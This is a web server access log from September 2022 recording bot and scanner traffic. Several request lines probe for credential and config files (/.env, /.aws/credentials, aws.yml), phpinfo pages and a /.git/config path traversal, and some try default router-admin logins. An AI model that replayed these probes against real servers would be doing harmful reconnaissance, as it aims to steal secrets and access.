20.25.116.0 - - [05/Sep/2022:18:42:02 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
20.25.116.0 - - [05/Sep/2022:18:42:02 +0000] "GET /_profiler/phpinfo HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36"
20.25.116.0 - - [05/Sep/2022:18:42:02 +0000] "GET /phpinfo.php HTTP/1.1" 404 16 "-" "Mozilla/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36"
20.25.116.0 - - [05/Sep/2022:18:42:02 +0000] "GET /phpinfo HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36"
20.25.116.0 - - [05/Sep/2022:18:42:02 +0000] "GET /aws.yml HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36"
20.25.116.0 - - [05/Sep/2022:18:42:02 +0000] "GET /.env.bak HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36"
20.25.116.0 - - [05/Sep/2022:18:42:02 +0000] "GET /info.php HTTP/1.1" 404 16 "-" "Mozilla/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36"
20.25.116.0 - - [05/Sep/2022:18:42:02 +0000] "GET /.aws/credentials HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36"
20.25.116.0 - - [05/Sep/2022:18:42:02 +0000] "GET / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36"
20.25.116.0 - - [05/Sep/2022:18:42:02 +0000] "GET /config/aws.yml HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36"
20.25.116.0 - - [05/Sep/2022:18:42:02 +0000] "GET / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36"
20.25.116.0 - - [05/Sep/2022:18:42:02 +0000] "GET /config.js HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36"
128.199.56.57 - - [05/Sep/2022:18:44:25 +0000] "GET / HTTP/1.0" 200 32 "-" "-"
2.57.122.98 - - [05/Sep/2022:19:24:57 +0000] "GET / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
36.74.42.81 - - [05/Sep/2022:20:03:33 +0000] "GET / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
124.89.86.164 - - [05/Sep/2022:20:19:51 +0000] "GET / HTTP/1.1" 400 226 "-" "-"
124.156.223.97 - - [05/Sep/2022:20:41:33 +0000] "GET / HTTP/1.1" 200 32 "-" "'Mozilla/5.0"
185.254.196.115 - - [05/Sep/2022:21:19:06 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.115 - - [05/Sep/2022:21:19:06 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.217.54 - - [05/Sep/2022:21:22:28 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.217.54 - - [05/Sep/2022:21:22:28 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
64.225.5.28 - - [05/Sep/2022:21:43:20 +0000] "GET / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (compatible; InternetMeasurement/1.0; +https://internet-measurement.com/)"
185.220.101.188 - - [05/Sep/2022:21:44:46 +0000] "GET /favicon.ico HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36"
167.172.37.123 - - [05/Sep/2022:21:44:47 +0000] "GET /favicon.ico HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36"
205.210.31.172 - - [05/Sep/2022:21:49:58 +0000] "GET / HTTP/1.0" 200 32 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
92.118.39.88 - - [05/Sep/2022:21:57:21 +0000] "GET / HTTP/1.1" 200 32 "-" "-"
205.210.31.24 - - [05/Sep/2022:22:02:31 +0000] "\x16\x03\x01" 400 226 "-" "-"
185.254.196.115 - - [05/Sep/2022:22:45:21 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.115 - - [05/Sep/2022:22:45:21 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.217.54 - - [05/Sep/2022:22:53:24 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.217.54 - - [05/Sep/2022:22:53:24 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
66.249.70.236 - - [05/Sep/2022:23:15:22 +0000] "GET /robots.txt HTTP/1.1" 404 196 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.70.236 - - [05/Sep/2022:23:15:22 +0000] "GET / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.101 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
205.210.31.28 - - [05/Sep/2022:23:17:10 +0000] "GET / HTTP/1.0" 200 32 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
2.57.122.98 - - [05/Sep/2022:23:47:00 +0000] "GET / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
135.125.217.54 - - [06/Sep/2022:00:01:37 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.217.54 - - [06/Sep/2022:00:01:37 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.115 - - [06/Sep/2022:00:10:08 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.115 - - [06/Sep/2022:00:10:09 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
205.210.31.9 - - [06/Sep/2022:00:38:10 +0000] "GET / HTTP/1.1" 200 32 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
162.62.191.231 - - [06/Sep/2022:01:00:14 +0000] "GET / HTTP/1.1" 200 32 "-" "curl/7.64.1"
209.141.49.169 - - [06/Sep/2022:01:00:32 +0000] "GET / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
209.141.49.169 - - [06/Sep/2022:01:00:32 +0000] "GET /favicon.ico HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
209.141.36.231 - - [06/Sep/2022:01:00:44 +0000] "GET / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
209.141.36.231 - - [06/Sep/2022:01:00:45 +0000] "GET /favicon.ico HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
135.125.217.54 - - [06/Sep/2022:01:09:39 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.217.54 - - [06/Sep/2022:01:09:39 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
152.231.58.183 - - [06/Sep/2022:01:48:07 +0000] "GET / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
185.254.196.115 - - [06/Sep/2022:01:56:31 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.115 - - [06/Sep/2022:01:56:31 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.217.54 - - [06/Sep/2022:02:52:15 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.217.54 - - [06/Sep/2022:02:52:15 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.115 - - [06/Sep/2022:03:21:48 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.115 - - [06/Sep/2022:03:21:48 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.216.71.242 - - [06/Sep/2022:03:36:35 +0000] "GET / HTTP/1.1" 200 32 "-" "-"
185.216.71.242 - - [06/Sep/2022:03:36:38 +0000] "POST /debug.cgi HTTP/1.1" 404 196 "-" "python-requests/2.21.0"
135.125.217.54 - - [06/Sep/2022:03:52:20 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.217.54 - - [06/Sep/2022:03:52:21 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
130.211.54.158 - - [06/Sep/2022:03:53:56 +0000] "GET / HTTP/1.1" 200 32 "-" "python-requests/2.28.1"
172.105.77.209 - - [06/Sep/2022:04:39:21 +0000] "-" 408 - "-" "-"
185.254.196.115 - - [06/Sep/2022:04:53:20 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.115 - - [06/Sep/2022:04:53:21 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
198.98.59.132 - - [06/Sep/2022:04:54:45 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 196 "http://35.172.128.201:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
135.125.217.54 - - [06/Sep/2022:05:04:11 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.217.54 - - [06/Sep/2022:05:04:11 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
118.193.64.106 - - [06/Sep/2022:05:21:11 +0000] "GET / HTTP/1.1" 200 32 "-" "curl/7.29.0"
118.193.64.106 - - [06/Sep/2022:05:21:12 +0000] "\x16\x03\x01" 400 226 "-" "-"
179.43.175.140 - - [06/Sep/2022:05:41:52 +0000] "\x16\x03\x01" 400 226 "-" "-"
179.43.175.140 - - [06/Sep/2022:05:41:52 +0000] "GET /static../.git/config HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.67 Safari/537.36"
185.254.196.115 - - [06/Sep/2022:06:15:41 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.115 - - [06/Sep/2022:06:15:41 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.246.189 - - [06/Sep/2022:06:37:15 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.246.189 - - [06/Sep/2022:06:37:15 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.115 - - [06/Sep/2022:07:42:15 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.115 - - [06/Sep/2022:07:42:15 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.246.189 - - [06/Sep/2022:07:57:14 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.246.189 - - [06/Sep/2022:07:57:14 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.115 - - [06/Sep/2022:09:17:14 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.115 - - [06/Sep/2022:09:17:15 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
43.131.66.209 - - [06/Sep/2022:09:19:25 +0000] "GET / HTTP/1.1" 200 32 "-" "curl/7.64.1"
209.141.35.128 - - [06/Sep/2022:09:19:38 +0000] "GET / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
209.141.35.128 - - [06/Sep/2022:09:19:39 +0000] "GET /favicon.ico HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
205.185.116.89 - - [06/Sep/2022:09:19:55 +0000] "GET / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
205.185.116.89 - - [06/Sep/2022:09:19:55 +0000] "GET /favicon.ico HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
66.240.236.116 - - [06/Sep/2022:09:22:25 +0000] "GET / HTTP/1.1" 200 32 "-" "Mozilla/5.0 zgrab/0.x"
91.6.153.53 - - [06/Sep/2022:09:45:06 +0000] "GET / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
45.131.165.88 - - [06/Sep/2022:10:04:00 +0000] "GET / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
2.57.122.98 - - [06/Sep/2022:10:23:17 +0000] "GET / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
128.1.248.42 - - [06/Sep/2022:10:24:31 +0000] "GET / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
135.125.246.189 - - [06/Sep/2022:10:24:38 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.246.189 - - [06/Sep/2022:10:24:39 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.115 - - [06/Sep/2022:10:44:25 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.115 - - [06/Sep/2022:10:44:26 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
64.227.28.112 - - [06/Sep/2022:11:32:58 +0000] "GET / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0"
135.125.246.189 - - [06/Sep/2022:11:49:44 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.246.189 - - [06/Sep/2022:11:49:44 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
2.57.122.98 - - [06/Sep/2022:11:50:29 +0000] "GET / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
185.254.196.115 - - [06/Sep/2022:12:16:30 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.115 - - [06/Sep/2022:12:16:30 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
65.49.20.68 - - [06/Sep/2022:12:22:51 +0000] "GET / HTTP/1.1" 200 32 "-" "-"
65.49.20.116 - - [06/Sep/2022:12:26:09 +0000] "GET /favicon.ico HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.101 Safari/537.36"
135.125.246.189 - - [06/Sep/2022:13:17:24 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.246.189 - - [06/Sep/2022:13:17:24 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
201.150.175.22 - - [06/Sep/2022:13:21:11 +0000] "GET / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
201.150.175.22 - - [06/Sep/2022:13:21:11 +0000] "GET /boaform/admin/formLogin?username=ec8&psd=ec8 HTTP/1.0" 404 196 "-" "-"
41.44.148.45 - - [06/Sep/2022:13:27:42 +0000] "GET / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
135.125.246.189 - - [06/Sep/2022:13:31:00 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.246.189 - - [06/Sep/2022:13:31:00 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.103.9 - - [06/Sep/2022:13:41:15 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.115 - - [06/Sep/2022:13:47:34 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.115 - - [06/Sep/2022:13:47:34 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
190.207.160.252 - - [06/Sep/2022:14:02:19 +0000] "GET / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
2.57.122.98 - - [06/Sep/2022:14:20:17 +0000] "GET / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
201.150.179.44 - - [06/Sep/2022:14:56:05 +0000] "GET / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
201.150.179.44 - - [06/Sep/2022:14:56:05 +0000] "GET /boaform/admin/formLogin?username=adminisp&psd=adminisp HTTP/1.0" 404 196 "-" "-"
59.98.187.195 - - [06/Sep/2022:15:14:27 +0000] "GET / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
135.125.246.189 - - [06/Sep/2022:15:17:59 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.246.189 - - [06/Sep/2022:15:17:59 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.115 - - [06/Sep/2022:15:19:04 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.115 - - [06/Sep/2022:15:19:04 +0000] "POST / HTTP/1.1" 200 32 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
20.211.45.185 - - [06/Sep/2022:15:33:44 +0000] "GET /config.js HTTP/1.1" 404 196 "-" "python-requests/2.27.1"
20.211.45.185 - - [06/Sep/2022:15:33:44 +0000] "GET /_profiler/phpinfo HTTP/1.1" 404 196 "-" "Mozila/5.0"
20.211.45.185 - - [06/Sep/2022:15:33:45 +0000] "POST / HTTP/1.1" 200 32 "-" "python-requests/2.27.1"
20.211.45.185 - - [06/Sep/2022:15:33:46 +0000] "GET /.env HTTP/1.1" 404 196 "-" "Mozila/5.0"
20.211.45.185 - - [06/Sep/2022:15:33:46 +0000] "POST / HTTP/1.1" 200 32 "-" "python-requests/2.27.1"
20.211.45.185 - - [06/Sep/2022:15:33:47 +0000] "GET /php.php HTTP/1.1" 404 16 "-" "Mozila/5.0"
20.211.45.185 - - [06/Sep/2022:15:33:47 +0000] "POST / HTTP/1.1" 200 32 "-" "python-requests/2.27.1"
20.211.45.185 - - [06/Sep/2022:15:33:48 +0000] "GET /test.php HTTP/1.1" 404 16 "-" "Mozila/5.0"
20.211.45.185 - - [06/Sep/2022:15:33:49 +0000] "POST / HTTP/1.1" 200 32 "-" "python-requests/2.27.1"
20.211.45.185 - - [06/Sep/2022:15:33:49 +0000] "GET /p.php HTTP/1.1" 404 16 "-" "Mozila/5.0"
20.211.45.185 - - [06/Sep/2022:15:33:50 +0000] "POST / HTTP/1.1" 200 32 "-" "python-requests/2.27.1"
